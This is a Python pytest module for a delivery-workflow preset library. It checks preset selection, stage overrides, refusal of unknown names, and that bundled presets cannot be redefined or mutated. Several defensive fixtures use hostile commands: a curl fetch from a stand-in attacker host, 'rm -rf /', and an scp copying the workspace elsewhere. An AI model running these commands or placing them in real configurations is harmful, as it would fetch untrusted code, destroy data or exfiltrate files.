"""Selecting a workflow preset, overriding one stage of it, and defining your own.

The bundled tables are pinned in ``test_bundled_presets``. What is pinned here is
the library around them, where three properties decide whether a selection means
anything:

* **Layering, not replacement.** A project that names a preset and rewrites one
  stage keeps the preset's other stages. There is one layering rule -- the stage
  resolution the workflow already ran -- and the preset is its widest layer, so
  the answer to "who declared this stage" is produced in one place.
* **Selectable identically is not trusted identically.** A user-defined preset is
  a declaration in the configuration document; a bundled one is the engine's.
  Sharing a name is refused at the write path, and the reader consults the
  bundled table first, so neither door lets a document redefine what
  ``git-pull-request`` runs.
* **A name that does not resolve is refused.** Resolving to nothing would leave a
  project running the zero-configuration workflow while its configuration named a
  preset -- the worst of the three outcomes, because it reports as a project that
  configured nothing rather than as a selection that failed.
"""

from __future__ import annotations

import sys
from typing import Any

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from kiro_crew.apps.builtins.spec_engine.engine.config import (
    DASHBOARD_SURFACE,
    ConfigStore,
    ConfigValidationError,
    ConfigWriteRefused,
    ValueOrigin,
)
from kiro_crew.apps.builtins.spec_engine.engine.config.schema import (
    WORKFLOW_PRESETS_KEY,
    validate_config_document,
)
from kiro_crew.apps.builtins.spec_engine.engine.delivery.stages import StageExecutor, StageOutcome
from kiro_crew.apps.builtins.spec_engine.engine.delivery.variables import RunContext
from kiro_crew.apps.builtins.spec_engine.engine.delivery.workflow import (
    ISOLATE_STAGE,
    WORKFLOW_PRESET_NAMES,
    WORKFLOW_PRESETS,
    DeliveryWorkflow,
    workflow_preset_definition,
    workflow_presets,
)

#: A user-defined preset, in the shape configuration holds it. Deliberately not a
#: copy of a bundled one: an organization's own review system is the case this
#: exists for, and its submit stage is a command the engine ships no preset for.
ORG_PRESET: dict[str, Any] = {
    "stages": {
        ISOLATE_STAGE: [["git", "worktree", "add", "{isolated_path}", "-b", "{branch_name}"]],
        "submit": [["org-review", "create", "--title", "{review_title}"]],
        "verify": [["make", "test"]],
    }
}


@pytest.fixture()
def store(tmp_path: Any) -> ConfigStore:
    return ConfigStore(tmp_path / "state")


def configure(store: ConfigStore, document: dict[str, Any]) -> None:
    """Write through the operator surface, so every document here is one the
    write path accepted rather than one hand-built past it."""
    store.write(document, surface=DASHBOARD_SURFACE)


def argv_of(workflow: DeliveryWorkflow, stage: str) -> list[list[str]]:
    resolved = workflow.stage(stage)
    assert resolved is not None, f"expected {stage} to resolve"
    return [list(command.source) for command in resolved.commands]


def bundled_argv(preset: str, stage: str) -> list[list[str]]:
    return [list(argv) for argv in workflow_presets(preset)["stages"][stage]]


class TestSelectingABundledPreset:
    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_every_stage_of_the_selected_preset_resolves(
        self, store: ConfigStore, name: str
    ) -> None:
        configure(store, {"workflow": {"preset": name}})
        workflow = DeliveryWorkflow.load(store)
        expected = workflow_presets(name)["stages"]
        assert set(workflow.configured_stages()) == set(expected)
        for stage in expected:
            assert argv_of(workflow, stage) == bundled_argv(name, stage)

    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_a_selected_stage_reports_the_preset_it_came_from(
        self, store: ConfigStore, name: str
    ) -> None:
        configure(store, {"workflow": {"preset": name}})
        resolved = DeliveryWorkflow.load(store).stage(ISOLATE_STAGE)
        assert resolved is not None
        assert resolved.preset == name
        assert resolved.from_preset
        # The engine's own definition, not a layer's declaration.
        assert resolved.origin is ValueOrigin.BUNDLED_DEFAULT

    def test_a_project_selection_replaces_the_app_wide_one(self, store: ConfigStore) -> None:
        configure(
            store,
            {
                "workflow": {"preset": "git-pull-request"},
                "projects": {
                    "acme": {"path": "/somewhere", "workflow": {"preset": "git-merge-request"}}
                },
            },
        )
        selection = DeliveryWorkflow.load(store, project="acme").selected_preset()
        assert selection is not None
        assert selection.name == "git-merge-request"
        assert selection.origin is ValueOrigin.PROJECT_CONFIG
        assert selection.declared_at == "projects.acme.workflow.preset"

    def test_a_project_without_its_own_selection_inherits_the_app_wide_one(
        self, store: ConfigStore
    ) -> None:
        configure(store, {"workflow": {"preset": "local-only"}})
        selection = DeliveryWorkflow.load(store, project="acme").selected_preset()
        assert selection is not None
        assert selection.name == "local-only"
        assert selection.origin is ValueOrigin.APP_CONFIG

    def test_no_selection_leaves_the_project_unconfigured(self, store: ConfigStore) -> None:
        configure(store, {"projects": {"acme": {"path": "/somewhere"}}})
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert workflow.selected_preset() is None
        assert not workflow.configured


class TestARefusedSelection:
    @pytest.mark.parametrize(
        "name",
        [
            # A review system the engine ships no preset for. Naming one must not
            # yield an empty workflow the project then runs as zero-configuration.
            "git-with-review-board",
            "internal-code-review",
            "GIT-PULL-REQUEST",
            "git-pull-request ",
        ],
    )
    def test_an_unbundled_undefined_name_is_refused(self, store: ConfigStore, name: str) -> None:
        configure(
            store, {"projects": {"acme": {"path": "/somewhere", "workflow": {"preset": name}}}}
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        with pytest.raises(ConfigValidationError) as raised:
            workflow.selected_preset()
        assert raised.value.errors[0].path == "projects.acme.workflow.preset"

    def test_the_refusal_names_the_bundled_alternatives(self, store: ConfigStore) -> None:
        configure(store, {"workflow": {"preset": "no-such-preset"}})
        with pytest.raises(ConfigValidationError) as raised:
            DeliveryWorkflow.load(store).selected_preset()
        message = str(raised.value)
        for name in WORKFLOW_PRESET_NAMES:
            assert name in message

    def test_the_refusal_lists_the_user_defined_presets_too(self, store: ConfigStore) -> None:
        configure(
            store,
            {"workflow": {"preset": "org-typo", WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}}},
        )
        with pytest.raises(ConfigValidationError) as raised:
            DeliveryWorkflow.load(store).selected_preset()
        assert "org-review" in str(raised.value)

    def test_a_blank_name_is_refused_rather_than_read_as_no_selection(
        self, store: ConfigStore
    ) -> None:
        configure(store, {"workflow": {"preset": "   "}})
        with pytest.raises(ConfigValidationError):
            DeliveryWorkflow.load(store).selected_preset()

    def test_the_refusal_reaches_every_reader_of_the_workflow(self, store: ConfigStore) -> None:
        """Not only the selection accessor: a caller asking whether the project
        is configured, or resolving a stage, must not get an answer built from a
        selection that did not resolve."""
        configure(store, {"workflow": {"preset": "no-such-preset"}})
        workflow = DeliveryWorkflow.load(store)
        with pytest.raises(ConfigValidationError):
            workflow.stage(ISOLATE_STAGE)
        with pytest.raises(ConfigValidationError):
            workflow.configured_stages()
        with pytest.raises(ConfigValidationError):
            workflow.isolates


class TestOverridingOneStage:
    def test_overriding_submit_leaves_the_other_stages_the_presets(
        self, store: ConfigStore
    ) -> None:
        configure(
            store,
            {
                "projects": {
                    "acme": {
                        "path": "/somewhere",
                        "workflow": {
                            "preset": "git-pull-request",
                            "stages": {"submit": [["org-review", "create"]]},
                        },
                    }
                }
            },
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert argv_of(workflow, "submit") == [["org-review", "create"]]
        assert argv_of(workflow, ISOLATE_STAGE) == bundled_argv("git-pull-request", ISOLATE_STAGE)

    def test_the_overridden_stage_reports_the_project_and_the_rest_the_preset(
        self, store: ConfigStore
    ) -> None:
        configure(
            store,
            {
                "projects": {
                    "acme": {
                        "path": "/somewhere",
                        "workflow": {
                            "preset": "git-pull-request",
                            "stages": {"submit": [["org-review", "create"]]},
                        },
                    }
                }
            },
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        submit = workflow.stage("submit")
        isolate = workflow.stage(ISOLATE_STAGE)
        assert submit is not None and isolate is not None
        assert submit.preset is None
        assert submit.origin is ValueOrigin.PROJECT_CONFIG
        assert submit.declared_at == "projects.acme.workflow.stages.submit"
        assert isolate.preset == "git-pull-request"

    def test_an_app_level_stage_also_overrides_the_preset(self, store: ConfigStore) -> None:
        configure(
            store,
            {
                "workflow": {
                    "preset": "local-only",
                    "stages": {"verify": [["make", "check"]]},
                }
            },
        )
        workflow = DeliveryWorkflow.load(store)
        assert argv_of(workflow, "verify") == [["make", "check"]]
        assert argv_of(workflow, ISOLATE_STAGE) == bundled_argv("local-only", ISOLATE_STAGE)

    def test_a_project_stage_beats_an_app_stage_beats_the_preset(self, store: ConfigStore) -> None:
        configure(
            store,
            {
                "workflow": {
                    "preset": "local-only",
                    "stages": {"verify": [["make", "app-check"]]},
                },
                "projects": {
                    "acme": {
                        "path": "/somewhere",
                        "workflow": {"stages": {"verify": [["make", "project-check"]]}},
                    }
                },
            },
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert argv_of(workflow, "verify") == [["make", "project-check"]]
        assert argv_of(workflow, ISOLATE_STAGE) == bundled_argv("local-only", ISOLATE_STAGE)

    def test_a_stage_the_preset_does_not_define_can_be_added(self, store: ConfigStore) -> None:
        configure(
            store,
            {
                "workflow": {
                    "preset": "git-pull-request",
                    "stages": {"publish": [["git", "tag", "{branch_name}"]]},
                }
            },
        )
        workflow = DeliveryWorkflow.load(store)
        assert argv_of(workflow, "publish") == [["git", "tag", "{branch_name}"]]
        assert argv_of(workflow, "submit") == bundled_argv("git-pull-request", "submit")

    @settings(max_examples=40, deadline=None)
    @given(
        preset=st.sampled_from(WORKFLOW_PRESET_NAMES),
        overridden=st.sets(st.sampled_from(("isolate", "submit", "verify", "publish", "teardown"))),
    )
    def test_each_stage_resolves_to_its_narrowest_declaration(
        self, tmp_path_factory: Any, preset: str, overridden: set[str]
    ) -> None:
        """The layering property, over any subset of overridden stages: a stage
        the project declared is the project's, every other stage the preset
        defines is the preset's, and nothing else resolves."""
        config = ConfigStore(tmp_path_factory.mktemp("state"))
        stages = {stage: [["echo", f"override-{stage}"]] for stage in sorted(overridden)}
        document: dict[str, Any] = {"workflow": {"preset": preset}}
        if stages:
            document["workflow"]["stages"] = stages
        configure(config, document)

        workflow = DeliveryWorkflow.load(config)
        preset_stages = workflow_presets(preset)["stages"]
        for stage in ("isolate", "submit", "verify", "publish", "teardown"):
            resolved = workflow.stage(stage)
            if stage in overridden:
                assert resolved is not None
                assert [list(c.source) for c in resolved.commands] == [
                    ["echo", f"override-{stage}"]
                ]
                assert resolved.preset is None
            elif stage in preset_stages:
                assert resolved is not None
                assert [list(c.source) for c in resolved.commands] == bundled_argv(preset, stage)
                assert resolved.preset == preset
            else:
                assert resolved is None


class TestUserDefinedPresets:
    def test_a_user_defined_preset_is_selected_the_same_way(self, store: ConfigStore) -> None:
        configure(
            store,
            {
                "workflow": {WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}},
                "projects": {"acme": {"path": "/somewhere", "workflow": {"preset": "org-review"}}},
            },
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert argv_of(workflow, "submit") == ORG_PRESET["stages"]["submit"]
        assert set(workflow.configured_stages()) == set(ORG_PRESET["stages"])

    def test_its_stages_report_the_document_path_an_operator_edits(
        self, store: ConfigStore
    ) -> None:
        configure(
            store,
            {
                "workflow": {
                    "preset": "org-review",
                    WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET},
                }
            },
        )
        resolved = DeliveryWorkflow.load(store).stage("submit")
        assert resolved is not None
        assert resolved.preset == "org-review"
        # A declaration in the document, unlike a bundled definition, so it
        # reports as configuration and at the path that holds it.
        assert resolved.origin is ValueOrigin.APP_CONFIG
        assert resolved.declared_at == "workflow.presets.org-review.stages.submit"

    def test_a_stage_of_a_user_defined_preset_is_overridable_identically(
        self, store: ConfigStore
    ) -> None:
        configure(
            store,
            {
                "workflow": {WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}},
                "projects": {
                    "acme": {
                        "path": "/somewhere",
                        "workflow": {
                            "preset": "org-review",
                            "stages": {"verify": [["make", "acme-test"]]},
                        },
                    }
                },
            },
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert argv_of(workflow, "verify") == [["make", "acme-test"]]
        assert argv_of(workflow, "submit") == ORG_PRESET["stages"]["submit"]

    def test_a_definition_is_editable_after_creation(self, store: ConfigStore) -> None:
        configure(store, {"workflow": {WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}}})
        edited = {"stages": dict(ORG_PRESET["stages"], submit=[["org-review", "create", "--v2"]])}
        configure(store, {"workflow": {WORKFLOW_PRESETS_KEY: {"org-review": edited}}})
        configure(
            store,
            {"projects": {"acme": {"path": "/somewhere", "workflow": {"preset": "org-review"}}}},
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert argv_of(workflow, "submit") == [["org-review", "create", "--v2"]]

    def test_a_bundled_preset_copies_into_an_editable_definition(self, store: ConfigStore) -> None:
        definition = workflow_preset_definition("git-pull-request")
        # A definition, not a selection: it records no preset name of its own,
        # because the first edit would make that name a lie.
        assert set(definition) == {"stages"}
        definition["stages"]["submit"] = [["org-review", "create"]]
        configure(
            store,
            {
                "workflow": {WORKFLOW_PRESETS_KEY: {"org-pull-request": definition}},
                "projects": {
                    "acme": {"path": "/somewhere", "workflow": {"preset": "org-pull-request"}}
                },
            },
        )
        workflow = DeliveryWorkflow.load(store, project="acme")
        assert argv_of(workflow, "submit") == [["org-review", "create"]]
        # The stages the copy did not edit are still the bundled ones.
        assert argv_of(workflow, ISOLATE_STAGE) == bundled_argv("git-pull-request", ISOLATE_STAGE)

    def test_copying_an_unbundled_name_is_refused(self) -> None:
        with pytest.raises(KeyError):
            workflow_preset_definition("git-with-review-board")

    def test_a_definition_with_no_stages_is_refused(self, store: ConfigStore) -> None:
        """A selection resolving to nothing reads as a project that configured no
        workflow, so the empty definition never becomes selectable."""
        with pytest.raises(ConfigValidationError):
            configure(store, {"workflow": {WORKFLOW_PRESETS_KEY: {"org-review": {"stages": {}}}}})

    def test_definitions_are_app_level_only(self, store: ConfigStore) -> None:
        """One name, one definition. A project-level definition map would give a
        selected name two possible answers and need a rule to pick one."""
        with pytest.raises(ConfigValidationError):
            configure(
                store,
                {
                    "projects": {
                        "acme": {
                            "path": "/somewhere",
                            "workflow": {WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}},
                        }
                    }
                },
            )


class TestBundledNamesCannotBeRedefined:
    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_the_write_path_refuses_a_definition_reusing_a_bundled_name(
        self, store: ConfigStore, name: str
    ) -> None:
        with pytest.raises(ConfigValidationError):
            configure(
                store,
                {
                    "workflow": {
                        WORKFLOW_PRESETS_KEY: {
                            name: {"stages": {"submit": [["curl", "http://attacker.test/x.sh"]]}}
                        }
                    }
                },
            )

    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_the_validator_names_the_definition_and_says_to_copy_it(self, name: str) -> None:
        errors = validate_config_document(
            {"workflow": {WORKFLOW_PRESETS_KEY: {name: {"stages": {"submit": [["x"]]}}}}}
        )
        assert [error.path for error in errors] == [f"workflow.presets.{name}"]
        assert "copy it" in errors[0].message

    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_a_shadowing_definition_that_skipped_validation_still_loses(self, name: str) -> None:
        """The second door. The write path refuses the definition, but a document
        edited on disk, or restored from elsewhere, reaches the reader without
        passing it -- and the reader consults the bundled table first, so the
        commands that run are the engine's."""
        document = {
            "workflow": {
                "preset": name,
                WORKFLOW_PRESETS_KEY: {
                    name: {"stages": {ISOLATE_STAGE: [["curl", "http://attacker.test/x.sh"]]}}
                },
            }
        }
        workflow = DeliveryWorkflow(document)
        selection = workflow.selected_preset()
        assert selection is not None and selection.bundled
        assert argv_of(workflow, ISOLATE_STAGE) == bundled_argv(name, ISOLATE_STAGE)


class TestBundledDefinitionsStayReadOnly:
    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_mutating_a_resolved_selection_deeply_leaves_the_table_pristine(
        self, store: ConfigStore, name: str
    ) -> None:
        """The reader hands out the same copy for every stage of one run, so this
        reaches through it: the stage map, one stage's command list, and one
        command's argv."""
        pristine = {
            stage: [list(a) for a in argv] for stage, argv in WORKFLOW_PRESETS[name].items()
        }
        configure(store, {"workflow": {"preset": name}})

        selection = DeliveryWorkflow.load(store).selected_preset()
        assert selection is not None
        stages: Any = selection.stages
        stages[ISOLATE_STAGE].append(["curl", "http://attacker.test/x.sh"])
        stages[ISOLATE_STAGE][0].append("--injected")
        stages["publish"] = [["scp", "-r", ".", "elsewhere:/"]]

        assert {
            s: [list(a) for a in argv] for s, argv in WORKFLOW_PRESETS[name].items()
        } == pristine
        # And the next reader of the same configuration gets the pristine commands.
        assert argv_of(DeliveryWorkflow.load(store), ISOLATE_STAGE) == [
            list(argv) for argv in pristine[ISOLATE_STAGE]
        ]

    def test_a_config_write_cannot_reach_a_bundled_definition(self, store: ConfigStore) -> None:
        """The only spelling by which configuration could name a bundled preset's
        definition is a same-named entry in the definitions map, and that is
        refused. Nothing else in the document addresses it."""
        before = {name: dict(preset) for name, preset in WORKFLOW_PRESETS.items()}
        with pytest.raises(ConfigValidationError):
            configure(
                store,
                {
                    "workflow": {
                        WORKFLOW_PRESETS_KEY: {
                            "local-only": {"stages": {"submit": [["rm", "-rf", "/"]]}}
                        }
                    }
                },
            )
        configure(store, {"workflow": {"preset": "local-only", "stages": {"submit": [["true"]]}}})
        DeliveryWorkflow.load(store).configured_stages()
        assert {name: dict(preset) for name, preset in WORKFLOW_PRESETS.items()} == before

    @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
    def test_the_table_itself_holds_nothing_mutable_in_place(self, name: str) -> None:
        """Structural, rather than by convention: there is no list to append to
        and no dict to assign into below the section mapping."""
        for commands in WORKFLOW_PRESETS[name].values():
            assert isinstance(commands, tuple)
            for argv in commands:
                assert isinstance(argv, tuple)
                assert all(isinstance(argument, str) for argument in argv)

    def test_the_definitions_map_is_fenced_from_tool_writes(self, store: ConfigStore) -> None:
        """``workflow`` is a config-only path, and the definitions live inside it,
        so the fence that keeps a tool call out of stage commands keeps it out of
        preset definitions too -- no second fence to keep in step."""
        with pytest.raises(ConfigWriteRefused):
            store.write(
                {"workflow": {WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}}},
                surface=_TOOL_SURFACE,
            )


#: A surface standing in for any caller that is not a human at a config panel.
_TOOL_SURFACE = type(DASHBOARD_SURFACE)("test-tool", operator_confirmed=False)


class TestThroughTheProductionCaller:
    """The selection reader is reached by the executor the pipeline already runs.

    Nothing new constructs a workflow: ``StageExecutor``, the delivery flow,
    integration, and the prerequisite checks all resolve a stage through
    ``DeliveryWorkflow.stage``, which is where the preset became the widest
    layer. These tests run the executor rather than the reader, so a preset that
    resolved only in the library would show up here as a stage that did nothing.
    """

    @pytest.fixture()
    def marker(self, tmp_path: Any) -> Any:
        return tmp_path / "ran.txt"

    def preset_writing(self, marker: Any) -> dict[str, Any]:
        """A user-defined preset whose verify stage leaves evidence it ran."""
        return {
            "stages": {
                "verify": [[sys.executable, "-c", f"open({str(marker)!r}, 'w').write('preset')"]]
            }
        }

    def test_a_selected_presets_command_reaches_the_process_boundary(
        self, store: ConfigStore, tmp_path: Any, marker: Any
    ) -> None:
        configure(
            store,
            {
                "workflow": {
                    "preset": "org-verify",
                    WORKFLOW_PRESETS_KEY: {"org-verify": self.preset_writing(marker)},
                }
            },
        )
        result = StageExecutor(store).run(
            "verify",
            RunContext(spec_name="example", spec_type="feature", workspace_path=str(tmp_path)),
        )
        assert result.outcome is StageOutcome.PASSED
        assert marker.read_text(encoding="utf-8") == "preset"

    def test_an_override_replaces_the_presets_command_at_the_boundary(
        self, store: ConfigStore, tmp_path: Any, marker: Any
    ) -> None:
        configure(
            store,
            {
                "workflow": {
                    "preset": "org-verify",
                    WORKFLOW_PRESETS_KEY: {"org-verify": self.preset_writing(marker)},
                    "stages": {
                        "verify": [
                            [sys.executable, "-c", f"open({str(marker)!r}, 'w').write('override')"]
                        ]
                    },
                }
            },
        )
        result = StageExecutor(store).run(
            "verify",
            RunContext(spec_name="example", spec_type="feature", workspace_path=str(tmp_path)),
        )
        assert result.outcome is StageOutcome.PASSED
        assert marker.read_text(encoding="utf-8") == "override"

    def test_an_unresolvable_selection_refuses_the_stage_rather_than_skipping_it(
        self, store: ConfigStore, tmp_path: Any
    ) -> None:
        """Skipping is the outcome for a stage nobody configured. A stage whose
        preset did not resolve was configured -- by a name that means nothing --
        so it must refuse and say so, not report the run as complete."""
        configure(store, {"workflow": {"preset": "no-such-preset"}})
        result = StageExecutor(store).run(
            "verify",
            RunContext(spec_name="example", spec_type="feature", workspace_path=str(tmp_path)),
        )
        assert result.outcome is StageOutcome.REFUSED
        assert "no-such-preset" in (result.reason or "")
